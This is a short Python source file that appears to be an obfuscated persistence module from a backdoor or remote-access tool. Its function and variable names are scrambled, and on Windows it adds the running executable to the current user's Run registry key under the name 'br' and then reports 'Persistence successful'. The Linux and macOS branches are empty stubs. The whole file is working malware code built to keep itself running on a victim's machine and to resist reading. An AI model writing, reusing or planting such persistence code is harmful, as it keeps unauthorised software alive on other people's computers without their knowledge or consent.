# -*- coding: utf-8 -*-
import sys
def dyXLYTmDxswqnnTcGnlywEHdyEUxdUJp():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    ebkvclNekMQfnaGiVAXYLdLNMQmLONIP = r'Software\Microsoft\Windows\CurrentVersion\Run'
    iTfwinBodjKDIOrOMgKOzVgNcmPFCGWT = sys.executable
    try:
        PAVGCWaWDlPVnDNXZxlFZkOuCraAAvEx = _winreg.OpenKey(HKCU, ebkvclNekMQfnaGiVAXYLdLNMQmLONIP, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(PAVGCWaWDlPVnDNXZxlFZkOuCraAAvEx, 'br', 0, _winreg.REG_SZ, iTfwinBodjKDIOrOMgKOzVgNcmPFCGWT)
        _winreg.CloseKey(PAVGCWaWDlPVnDNXZxlFZkOuCraAAvEx)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def JaLxhESQsOboogZLGGHZFXrDuenDIHoa():
    return False, 'nothing here yet'
def hgqLpJzoEIUsUdZJaCukwyjAyWnvFtIl():
    return False, 'nothing here yet'
def rphzMalkzLSwhCycxxBfPLhpijexPGfP(plat_type):
    if plat_type.startswith('win'):
        success, SBJnCYmiCSnwFBYVBdPIDQZBkenkIKsy = dyXLYTmDxswqnnTcGnlywEHdyEUxdUJp()
    elif plat_type.startswith('linux'):
        success, SBJnCYmiCSnwFBYVBdPIDQZBkenkIKsy = JaLxhESQsOboogZLGGHZFXrDuenDIHoa()
    elif plat_type.startswith('darwin'):
        success, SBJnCYmiCSnwFBYVBdPIDQZBkenkIKsy = hgqLpJzoEIUsUdZJaCukwyjAyWnvFtIl()
    else:
        return 'Error, platform unsupported.'
    if success:
        dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = 'Persistence successful, {}.'.format(SBJnCYmiCSnwFBYVBdPIDQZBkenkIKsy)
    else:
        dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = 'Persistence unsuccessful, {}.'.format(SBJnCYmiCSnwFBYVBdPIDQZBkenkIKsy)
    return dUbOKopZulDCXjKgabYUEDXBlmGWRIEE
